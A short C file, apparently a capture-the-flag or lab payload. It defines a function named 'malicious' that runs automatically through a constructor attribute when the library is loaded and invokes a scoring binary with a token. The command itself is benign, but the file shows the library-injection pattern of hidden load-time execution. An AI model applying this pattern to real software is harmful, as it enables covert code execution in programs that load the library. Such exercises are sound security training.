#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score f111a88c-5415-42e5-99e2-cf0a1967b6bb");
}
